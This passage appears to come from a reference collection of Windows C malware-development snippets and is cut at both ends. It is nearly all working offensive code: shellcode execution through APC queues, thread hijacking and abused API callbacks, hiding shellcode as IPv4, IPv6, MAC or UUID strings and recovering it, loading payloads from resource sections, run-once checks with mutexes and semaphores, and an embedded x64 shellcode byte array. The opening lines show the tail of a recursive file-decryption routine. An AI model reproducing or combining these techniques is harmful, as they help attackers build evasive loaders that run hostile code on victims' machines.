	if (!SetEndOfFile(hDestinationFile)) {
		printf("[!] SetEndOfFile Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (uTmpPntrVar && pwcLastDot)
		free(uTmpPntrVar);
	if (hSourceFile != INVALID_HANDLE_VALUE)
		CloseHandle(hSourceFile);
	if (hDestinationFile != INVALID_HANDLE_VALUE)
		CloseHandle(hDestinationFile);
	if (uFileBufferAddr)
		LocalFree((HLOCAL)uFileBufferAddr);
	return bResult;
}

// ===================================================================================================================================================

BOOL DecryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {

	if (!szDirectoryPath)
		return FALSE;

	WIN32_FIND_DATAW	FindFileData					= { 0x00 };
	WCHAR				szDirPath[MAX_PATH * 2]			= { 0x00 };
	WCHAR				szFullStrPath[MAX_PATH * 2]		= { 0x00 };
	HANDLE				hFind							= INVALID_HANDLE_VALUE;
	BOOL				bResult							= FALSE;

	_snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

	if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
		printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
			continue;

		_snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			printf("[*] Directory: %ws\n", szFullStrPath);

			if (!DecryptFilesInGivenDir(szFullStrPath))
				goto _END_OF_FUNC;
		}

		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			printf("\t> Decrypting File: %ws ... %s \n", szFullStrPath, DecryptGivenFile(szFullStrPath) ? "[+] DONE" : "[-] Failed");

	} while (FindNextFileW(hFind, &FindFileData));

	bResult = TRUE;

_END_OF_FUNC:
	if (hFind != INVALID_HANDLE_VALUE)
		FindClose(hFind);
	return bResult;
}
```
### Payload Execution Via APC Queues
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecutePayloadViaAPC(IN HANDLE hAlertableThread, IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	if (!hAlertableThread || !pStartAddress)
		return FALSE;

	if (!QueueUserAPC((PAPCFUNC)pStartAddress, hAlertableThread, uParameter)) {
		printf("[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Payload Deobfuscation Via IPv6Deobfuscation
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(PCSTR S, PCSTR* Terminator, PVOID Addr);

BOOL Ipv6Deobfuscation(IN CHAR* cIPv6Array[], IN SIZE_T sNmbrOfElements, OUT PBYTE* ppDeobfuscatedBuffer, OUT SIZE_T* psDeobfuscatedSize) {

	NTSTATUS					STATUS						= 0x00;
	fnRtlIpv6StringToAddressA	pRtlIpv6StringToAddressA	= NULL;
	PBYTE						pDeobfuscatedBuff			= NULL,
								pTmpBufferPntr				= NULL;
	PCSTR						Terminator					= NULL;
	HMODULE						hNtdll						= NULL;

	if (!(hNtdll = GetModuleHandle(L"ntdll"))) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if ((pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(hNtdll, "RtlIpv6StringToAddressA")) == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*psDeobfuscatedSize = sNmbrOfElements * 16;

	if ((pTmpBufferPntr = pDeobfuscatedBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psDeobfuscatedSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < sNmbrOfElements; i++) {

		if ((STATUS = pRtlIpv6StringToAddressA(cIPv6Array[i], &Terminator, pTmpBufferPntr)) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed With Error 0x%0.8X", STATUS);
			return FALSE;
		}

		pTmpBufferPntr = (PBYTE)(pTmpBufferPntr + 16);
	}

	*ppDeobfuscatedBuffer = pDeobfuscatedBuff;

	return TRUE;
}
```
### Payload Execution Via Thread Hijacking
```c
#include <windows.h>
#include <stdio.h>
BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pStartAddress) {

	CONTEXT		ThreadCtx	= { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };

	if (!hThread || !pStartAddress)
		return FALSE;

	if (SuspendThread(hThread) == ((DWORD)-1)) {
		printf("[!] SuspendThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rcx = pStartAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (ResumeThread(hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Text Section Payload Placement
```c
#include <windows.h>
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char RawX64CalcShellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};
```
### Payload Deobfuscation Via UUIDDeobfuscation
```c
#include <windows.h>
#include <stdio.h>
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(RPC_CSTR StringUuid, UUID* Uuid);

BOOL UUIDDeobfuscation(IN CHAR* cUUIDArray[], IN SIZE_T sNmbrOfElements, OUT PBYTE* ppDeobfuscatedBuffer, OUT SIZE_T* psDeobfuscatedSize) {

	NTSTATUS					STATUS						= 0x00;
	fnUuidFromStringA			pUuidFromStringA			= NULL;
	PBYTE						pDeobfuscatedBuff			= NULL,
								pTmpBufferPntr				= NULL;
	HMODULE						hRPcrt4						= NULL;

	if (!(hRPcrt4 = LoadLibraryW(L"rpcrt4"))) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if ((pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(hRPcrt4, "UuidFromStringA")) == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*psDeobfuscatedSize = sNmbrOfElements * 16;

	if ((pTmpBufferPntr = pDeobfuscatedBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psDeobfuscatedSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < sNmbrOfElements; i++) {

		if ((STATUS = pUuidFromStringA(cUUIDArray[i], pTmpBufferPntr)) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed With Error 0x%0.8X", STATUS);
			return FALSE;
		}

		pTmpBufferPntr = (PBYTE)(pTmpBufferPntr + 16);
	}

	*ppDeobfuscatedBuffer = pDeobfuscatedBuff;

	return TRUE;
}
```
### Payload Obfuscation Via MACFuscation
```c
#include <windows.h>
#include <stdio.h>
VOID GenerateMAC(IN INT A, IN INT B, IN INT C, IN INT D, IN INT E, IN INT F, OUT PCHAR ppcMACString) {
	unsigned char Output[18] = { 0x00 };
	sprintf_s(Output, sizeof(Output), "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", A, B, C, D, E, F);
	memcpy(ppcMACString, Output, sizeof(Output));
}

BOOL GenerateMacOutput(IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!pShellcodeBuffer || !sShellcodeSize)
		return FALSE;

	PBYTE	pNewPaddedShellcode		= pShellcodeBuffer;
	SIZE_T	sNewPaddedSize			= sShellcodeSize;

	if (sShellcodeSize % 6 != 0x00) {

		sNewPaddedSize = (sShellcodeSize + 6) - (sShellcodeSize % 6);
		pNewPaddedShellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewPaddedSize);

		if (!pNewPaddedShellcode) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewPaddedShellcode, pShellcodeBuffer, sShellcodeSize);
	}

	printf("#define ARRAY_ELEMENTS %d\n", (int)(sNewPaddedSize / 6));
	printf("CHAR* MacArray [ARRAY_ELEMENTS] = {\n\t");

	for (int i = 0, j = 0; i < sNewPaddedSize; i++) {

		if (i % 6 == 0) {

			unsigned char Mac[18] = { 0x00 };

			j++;

			GenerateMAC(
				pNewPaddedShellcode[i + 0x0], pNewPaddedShellcode[i + 0x1],
				pNewPaddedShellcode[i + 0x2], pNewPaddedShellcode[i + 0x3],
				pNewPaddedShellcode[i + 0x4], pNewPaddedShellcode[i + 0x5],
				Mac
			);

			if (i == sNewPaddedSize - 6)
				printf("\"%s\"", Mac);
			else
				printf("\"%s\", ", Mac);

			if (j % 4 == 0)
				printf("\n\t");

		}
	}

	printf("\n};\n");
}
```
### Payload Obfuscation Via IPv4Fuscation
```c
#include <windows.h>
#include <stdio.h>
VOID GenerateIpv4(IN INT A, IN INT B, IN INT C, IN INT D, OUT PCHAR ppcIPv4String) {
	unsigned char Output [16] = { 0x00 };
	sprintf_s(Output, sizeof(Output), "%d.%d.%d.%d", A, B, C, D);
	memcpy(ppcIPv4String, Output, sizeof(Output));
}

BOOL GenerateIpv4Output(IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!pShellcodeBuffer || !sShellcodeSize)
		return FALSE;

	PBYTE	pNewPaddedShellcode		= pShellcodeBuffer;
	SIZE_T	sNewPaddedSize			= sShellcodeSize;

	if (sShellcodeSize % 4 != 0x00) {
		sNewPaddedSize		= (sShellcodeSize + 4) - (sShellcodeSize % 4);
		pNewPaddedShellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewPaddedSize);

		if (!pNewPaddedShellcode) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewPaddedShellcode, pShellcodeBuffer, sShellcodeSize);
	}

	printf("#define ARRAY_ELEMENTS %d\n", (int)(sNewPaddedSize / 4));
	printf("CHAR* IPv4Array [ARRAY_ELEMENTS] = {\n\t");

	for (int i = 0, j = 0; i < sNewPaddedSize; i++){

		if (i % 4 == 0) {

			unsigned char IPv4 [16] = { 0x00 };

			j++;

			GenerateIpv4(pNewPaddedShellcode[i], pNewPaddedShellcode[i + 1], pNewPaddedShellcode[i + 2], pNewPaddedShellcode[i + 3], IPv4);

			if (i == sNewPaddedSize - 4)
				printf("\"%s\"", IPv4);
			else
				printf("\"%s\", ", IPv4);

			if (j % 4 == 0)
				printf("\n\t");
		}
	}

	printf("\n};\n");

}
```
### Payload Execution Control Via Events
```c
#include <windows.h>
#include <stdio.h>
BOOL IsPayloadRunning1(IN LPCWSTR szControlString) {

	if ((CreateEventW(NULL, FALSE, FALSE, szControlString) != NULL) && GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;
	else
		return FALSE;
}
```
### Payload Execution Control Via Mutexes
```c
BOOL IsPayloadRunning3(IN LPCWSTR szControlString) {

	if ((CreateMutexW(NULL, FALSE, szControlString) != NULL) && GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;
	else
		return FALSE;
}
```
### Payload Execution Control Via Semaphores
```c
#include <windows.h>
#include <stdio.h>
BOOL IsPayloadRunning2(IN LPCWSTR szControlString) {

	if ((CreateSemaphoreW(NULL, 10, 10, szControlString) != NULL) && GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;
	else
		return FALSE;
}
```
### Payload Execution Via VerifierEnumerateResource Callback Function
```c
#include <windows.h>
#include <stdio.h>
typedef ULONG (WINAPI* fnVerifierEnumerateResource)(HANDLE Process, ULONG Flags, ULONG ResourceType, PVOID ResourceCallback, PVOID EnumerationContext);

BOOL ExecPayloadViaCallbackFunc4(IN PVOID pStartAddress) {

	if (!pStartAddress)
		return FALSE;

	HMODULE						hVerifier					= NULL;
	fnVerifierEnumerateResource pVerifierEnumerateResource	= NULL;
	ULONG						uError						= 0x00;

	if (!(hVerifier = LoadLibraryA("verifier.dll"))) {
		printf("[!] LoadLibraryA Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pVerifierEnumerateResource = GetProcAddress(hVerifier, "VerifierEnumerateResource"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// ResourceType (3rd parm) = AvrfResourceHeapAllocation = 0
	if ((uError = pVerifierEnumerateResource(((HANDLE)-1), 0x00, 0x00, pStartAddress, NULL)) != ERROR_SUCCESS) {
		printf("[!] VerifierEnumerateResource Failed With Error: %d \n", uError);
		return FALSE;
	}

	return TRUE;
}
```
### Payload Obfuscation Via IPv6Fuscation
```c
#include <windows.h>
#include <stdio.h>
VOID GenerateIpv6(
	IN INT A, IN INT B, IN INT C, IN INT D,
	IN INT E, IN INT F, IN INT G, IN INT H,
	IN INT I, IN INT J, IN INT K, IN INT L,
	IN INT M, IN INT N, IN INT O, IN INT P,
	OUT PCHAR ppcIPv6String
) {

	unsigned char Output1[10] = { 0x00 };
	unsigned char Output2[10] = { 0x00 };
	unsigned char Output3[10] = { 0x00 };
	unsigned char Output4[10] = { 0x00 };
	unsigned char Output [40] = { 0x00 };

	sprintf_s(Output1, sizeof(Output1), "%0.2X%0.2X:%0.2X%0.2X", A, B, C, D);
	sprintf_s(Output2, sizeof(Output2), "%0.2X%0.2X:%0.2X%0.2X", E, F, G, H);
	sprintf_s(Output3, sizeof(Output3), "%0.2X%0.2X:%0.2X%0.2X", I, J, K, L);
	sprintf_s(Output4, sizeof(Output4), "%0.2X%0.2X:%0.2X%0.2X", M, N, O, P);

	sprintf_s(Output, sizeof(Output), "%s:%s:%s:%s", Output1, Output2, Output3, Output4);
	memcpy(ppcIPv6String, Output, sizeof(Output));
}

BOOL GenerateIpv6Output(IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!pShellcodeBuffer || !sShellcodeSize)
		return FALSE;

	PBYTE	pNewPaddedShellcode = pShellcodeBuffer;
	SIZE_T	sNewPaddedSize		= sShellcodeSize;

	if (sShellcodeSize % 16 != 0x00) {

		sNewPaddedSize		= (sShellcodeSize + 16) - (sShellcodeSize % 16);
		pNewPaddedShellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewPaddedSize);

		if (!pNewPaddedShellcode) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewPaddedShellcode, pShellcodeBuffer, sShellcodeSize);
	}

	printf("#define ARRAY_ELEMENTS %d\n", (int)(sNewPaddedSize / 16));
	printf("CHAR* IPv6Array [ARRAY_ELEMENTS] = {\n\t");

	for (int i = 0, j = 0; i < sNewPaddedSize; i++) {

		if (i % 16 == 0) {

			unsigned char IPv6[40] = { 0x00 };
			j++;
			GenerateIpv6(
				pNewPaddedShellcode[i + 0x0], pNewPaddedShellcode[i + 0x1], pNewPaddedShellcode[i + 0x2], pNewPaddedShellcode[i + 0x3],
				pNewPaddedShellcode[i + 0x4], pNewPaddedShellcode[i + 0x5], pNewPaddedShellcode[i + 0x6], pNewPaddedShellcode[i + 0x7],
				pNewPaddedShellcode[i + 0x8], pNewPaddedShellcode[i + 0x9], pNewPaddedShellcode[i + 0xA], pNewPaddedShellcode[i + 0xB],
				pNewPaddedShellcode[i + 0xC], pNewPaddedShellcode[i + 0xD], pNewPaddedShellcode[i + 0xE], pNewPaddedShellcode[i + 0xF],
				IPv6
			);

			if (i == sNewPaddedSize - 16)
				printf("\"%s\"", IPv6);
			else
				printf("\"%s\", ", IPv6);

			if (j % 3 == 0)
				printf("\n\t");

		}
	}

	printf("\n};\n");
}
```
### Payload Deobfuscation Via MACDeobfuscation
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(PCSTR S, PCSTR* Terminator, PVOID Addr);

BOOL MacDeobfuscation(IN CHAR* cMacArray[], IN SIZE_T sNmbrOfElements, OUT PBYTE* ppDeobfuscatedBuffer, OUT SIZE_T* psDeobfuscatedSize) {

	NTSTATUS						STATUS							= 0x00;
	fnRtlEthernetStringToAddressA	pRtlEthernetStringToAddressA	= NULL;
	PBYTE							pDeobfuscatedBuff				= NULL,
									pTmpBufferPntr					= NULL;
	PCSTR							Terminator						= NULL;
	HMODULE							hNtdll							= NULL;

	if (!(hNtdll = GetModuleHandle(L"ntdll"))) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if ((pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(hNtdll, "RtlEthernetStringToAddressA")) == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	*psDeobfuscatedSize = sNmbrOfElements * 6;

	if ((pTmpBufferPntr = pDeobfuscatedBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psDeobfuscatedSize)) == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	for (int i = 0; i < sNmbrOfElements; i++) {

		if ((STATUS = pRtlEthernetStringToAddressA(cMacArray[i], &Terminator, pTmpBufferPntr)) != 0x0) {
			printf("[!] RtlEthernetStringToAddressA Failed With Error 0x%0.8X \n", STATUS);
			return FALSE;
		}

		pTmpBufferPntr = (PBYTE)(pTmpBufferPntr + 6);
	}

	*ppDeobfuscatedBuffer = pDeobfuscatedBuff;

	return TRUE;
}
```
### Fetching a Payload From Resource Section
```c
#include <windows.h>
#include <stdio.h>
BOOL CustomFetchRsrcPayload(IN HMODULE hModule, IN CONST DWORD dwResourceId, OUT PBYTE* ppBuffer, OUT PSIZE_T psLength) {

	if (!hModule || !dwResourceId || !ppBuffer || !psLength)
		return FALSE;

	PVOID						pPayloadBaseAdrs			= NULL;
	ULONG_PTR					uBaseAddress				= hModule;
	PIMAGE_NT_HEADERS			pImgNtHdrs					= (PIMAGE_NT_HEADERS)(uBaseAddress + ((PIMAGE_DOS_HEADER)uBaseAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	PIMAGE_DATA_DIRECTORY				pImgEntryResourceDataDir	= &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
	PIMAGE_RESOURCE_DIRECTORY           pResourceDir				= NULL, pResourceDir2	= NULL, pResourceDir3	= NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY     pResourceEntry				= NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;
	PIMAGE_RESOURCE_DATA_ENTRY          pResource					= NULL;

	pResourceDir	= (PIMAGE_RESOURCE_DIRECTORY)(uBaseAddress + pImgEntryResourceDataDir->VirtualAddress);
	pResourceEntry	= (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);

	for (DWORD i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2		= (PIMAGE_RESOURCE_DIRECTORY)(uBaseAddress + pImgEntryResourceDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2		= (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == dwResourceId) {

			pResourceDir3		= (PIMAGE_RESOURCE_DIRECTORY)(uBaseAddress + pImgEntryResourceDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3		= (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);
			pResource			= (PIMAGE_RESOURCE_DATA_ENTRY)(uBaseAddress + pImgEntryResourceDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));
			pPayloadBaseAdrs	= (PVOID)(uBaseAddress + (pResource->OffsetToData));
			*psLength			= pResource->Size;
			break;
		}
	}

	if (!pPayloadBaseAdrs || !*psLength)
		goto _END_OF_FUNC;

	// Move the payload into writable memory
	if (!(*ppBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psLength))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	memcpy(*ppBuffer, pPayloadBaseAdrs, *psLength);

_END_OF_FUNC:
	return (*ppBuffer && *psLength) ? TRUE : FALSE;
}
```
### Payload Execution Via CreateTimerQueueTimer Callback Function
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecPayloadViaCallbackFunc1(IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	if (!pStartAddress)
		return FALSE;

	HANDLE	hTimer	= NULL;

	if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pStartAddress, uParameter, 0x00, 0x00, 0x00)) {
		printf("[!] CreateTimerQueueTimer Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Payload Execution Via EnumChildWindows Callback Function
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecPayloadViaCallbackFunc2(IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	if (!pStartAddress)
		return FALSE;

	if (!EnumChildWindows(NULL, (WNDENUMPROC)pStartAddress, uParameter)) {
		printf("[!] EnumChildWindows Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Payload Execution Via EnumUILanguagesW Callback Function
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecPayloadViaCallbackFunc3(IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	if (!pStartAddress)
		return FALSE;

	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pStartAddress, MUI_LANGUAGE_NAME, uParameter)) {
		printf("[!] EnumUILanguagesW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Fetching a Payload From Resource Section	
```c
#include <windows.h>
#include <stdio.h>
BOOL FetchRsrcPayloadViaWinAPIs(IN OPTIONAL HMODULE hModule, IN CONST DWORD dwResourceId, OUT PBYTE* ppBuffer, OUT PSIZE_T psLength) {

    HRSRC       hRsrc               = NULL;
    HGLOBAL     hGlobal             = NULL;
    PVOID       pPayloadBaseAdrs    = NULL;

    if (!dwResourceId || !ppBuffer || !psLength)
        goto _END_OF_FUNC;

    // Get the location to the data stored in .rsrc by its ID
    if (!(hRsrc = FindResourceW(hModule, MAKEINTRESOURCEW(dwResourceId), RT_RCDATA))) {
        printf("[!] FindResourceW Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    // Get a handle of a specified resource data
    if (!(hGlobal = LoadResource(hModule, hRsrc))) {
        printf("[!] LoadResource Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    // Get the address of the payload in the .rsrc section
    if (!(pPayloadBaseAdrs = LockResource(hGlobal))) {
        printf("[!] LockResource Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    // Get the size of the payload
    if (!(*psLength = (SIZE_T)SizeofResource(hModule, hRsrc))) {
        printf("[!] SizeofResource Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    // Move the payload into writable memory
    if (!(*ppBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *psLength))) {
        printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        goto _END_OF_FUNC;
    }

    memcpy(*ppBuffer, pPayloadBaseAdrs, *psLength);

_END_OF_FUNC:
    return (*ppBuffer && *psLength) ? TRUE : FALSE;
}
```
### Payload Obfuscation Via UUIDFuscation
```c
#include <windows.h>
#include <stdio.h>
VOID GenerateUUID(
	IN INT A, IN INT B, IN INT C, IN INT D,
	IN INT E, IN INT F, IN INT G, IN INT H,
	IN INT I, IN INT J, IN INT K, IN INT L,
	IN INT M, IN INT N, IN INT O, IN INT P,
	OUT PCHAR ppcUUIDString
) {

	unsigned char Output1[9]  = { 0x00 };
	unsigned char Output2[10] = { 0x00 };
	unsigned char Output3[10] = { 0x00 };
	unsigned char Output4[9]  = { 0x00 };
	unsigned char Output[37]  = { 0x00 };

	sprintf_s(Output1, sizeof(Output1), "%0.2X%0.2X%0.2X%0.2X",  D, C, B, A);
	sprintf_s(Output2, sizeof(Output2), "%0.2X%0.2X-%0.2X%0.2X", F, E, H, G);
	sprintf_s(Output3, sizeof(Output3), "%0.2X%0.2X-%0.2X%0.2X", I, J, K, L);
	sprintf_s(Output4, sizeof(Output4), "%0.2X%0.2X%0.2X%0.2X",  M, N, O, P);

	sprintf_s(Output, sizeof(Output), "%s-%s-%s%s", Output1, Output2, Output3, Output4);
	memcpy(ppcUUIDString, Output, sizeof(Output));
}


BOOL GenerateUUIDOutput(IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!pShellcodeBuffer || !sShellcodeSize)
		return FALSE;

	PBYTE	pNewPaddedShellcode = pShellcodeBuffer;
	SIZE_T	sNewPaddedSize		= sShellcodeSize;

	if (sShellcodeSize % 16 != 0x00) {

		sNewPaddedSize			= (sShellcodeSize + 16) - (sShellcodeSize % 16);
		pNewPaddedShellcode		= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewPaddedSize);

		if (!pNewPaddedShellcode) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewPaddedShellcode, pShellcodeBuffer, sShellcodeSize);
	}

	printf("#define ARRAY_ELEMENTS %d\n", (int)(sNewPaddedSize / 16));
	printf("CHAR* UUIDArray [ARRAY_ELEMENTS] = {\n\t");

	for (int i = 0, j = 0; i < sNewPaddedSize; i++) {

		if (i % 16 == 0) {

			unsigned char UUID[37] = { 0x00 };

			j++;

			GenerateUUID(
				pNewPaddedShellcode[i + 0x0], pNewPaddedShellcode[i + 0x1], pNewPaddedShellcode[i + 0x2], pNewPaddedShellcode[i + 0x3],
				pNewPaddedShellcode[i + 0x4], pNewPaddedShellcode[i + 0x5], pNewPaddedShellcode[i + 0x6], pNewPaddedShellcode[i + 0x7],
